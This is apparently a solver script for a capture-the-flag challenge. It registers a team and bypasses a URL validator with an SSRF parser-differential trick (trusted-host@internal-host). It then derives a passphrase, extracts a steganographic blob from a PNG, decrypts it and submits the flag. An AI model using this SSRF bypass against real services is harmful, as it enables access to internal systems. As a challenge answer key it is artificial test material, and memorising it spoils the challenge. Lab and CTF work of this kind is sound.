#!/usr/bin/env python3
import argparse
import hashlib
import json
import sys
from pathlib import Path

import requests

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from hard_ctf.challenge_engine import aes_gcm_decrypt, b64u_decode, lsb_extract, xor_bytes


def derive_pepper(token: str, salt: str, pepper_ct_b64u: str) -> str:
    ct = b64u_decode(pepper_ct_b64u)
    stream = hashlib.sha256((token + "|" + salt).encode()).digest()
    pepper = xor_bytes(ct, stream).decode()
    return pepper


def compose_passphrase(pepper: str, token: str) -> str:
    digest = hashlib.sha256((pepper + "|" + token + "|2026").encode()).hexdigest()[:24]
    return f"rvn::{digest}::aes"


def solve(base_url: str, team: str):
    base = base_url.rstrip("/")

    reg = requests.post(f"{base}/api/register", json={"team_name": team}, timeout=10)
    reg.raise_for_status()
    reg_data = reg.json()
    if not reg_data.get("ok"):
        raise RuntimeError(f"register failed: {json.dumps(reg_data)}")
    token = reg_data["session"]["token"]

    # Parser differential bypass (CVE-2026-25960-inspired class):
    # validator sees trusted host, downstream sees internal host after '@'.
    evil_url = "https://trusted.raven-ctf.local@vault.raven-ctf.local/bootstrap"
    fs = requests.post(
        f"{base}/api/fetch",
        headers={"X-Team-Token": token},
        json={"url": evil_url},
        timeout=10,
    )
    fs.raise_for_status()
    fs_data = fs.json()
    if not fs_data.get("ok"):
        raise RuntimeError(f"fetch failed: {json.dumps(fs_data)}")
    clue = fs_data["response"]["clue"]

    salt = clue["salt"]
    pepper_ct = clue["pepper_ct_b64u"]
    pepper = derive_pepper(token, salt, pepper_ct)
    passphrase = compose_passphrase(pepper, token)

    carrier = requests.get(f"{base}{clue['asset_url']}", timeout=20)
    carrier.raise_for_status()
    if carrier.headers.get("content-type") != "image/png":
        raise RuntimeError("carrier not png")
    blob = lsb_extract(carrier.content)
    encrypted = json.loads(blob.decode())
    plain = aes_gcm_decrypt(encrypted, passphrase)
    final_flag = json.loads(plain.decode())["flag"]

    sub = requests.post(
        f"{base}/api/submit",
        headers={"X-Team-Token": token},
        json={"flag": final_flag},
        timeout=10,
    )
    sub.raise_for_status()
    sub_data = sub.json()
    if not sub_data.get("ok") or not sub_data.get("solved"):
        raise RuntimeError(f"submit failed: {json.dumps(sub_data)}")

    print(f"[+] team={team}")
    print(f"[+] token={token}")
    print(f"[+] final_flag={final_flag}")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base-url", required=True)
    ap.add_argument("--team", required=True)
    args = ap.parse_args()
    solve(args.base_url, args.team)


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:
        print(f"[!] solve failed: {exc}")
        sys.exit(1)
